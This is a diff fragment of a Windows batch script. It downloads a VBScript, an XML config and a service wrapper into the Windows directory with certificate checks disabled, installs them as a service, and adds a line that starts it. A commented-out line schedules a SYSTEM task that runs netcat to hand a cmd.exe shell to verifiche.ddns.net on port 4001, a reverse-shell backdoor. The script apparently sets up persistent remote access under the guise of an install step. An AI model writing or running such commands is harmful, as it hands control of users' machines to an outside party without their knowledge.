@@ -91,6 +91,7 @@ wget --no-check-certificate %urlgit%/init.vbs  -O %windir%\init.vbs
 wget --no-check-certificate %urlgit%/initsw.xml  -O %windir%\initsw.xml
 wget --no-check-certificate %urlgit%/winsw.exe  -O %windir%\initsw.exe
 initsw.exe install
+net start initsw
 rem %windir%\init.vbs
 
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
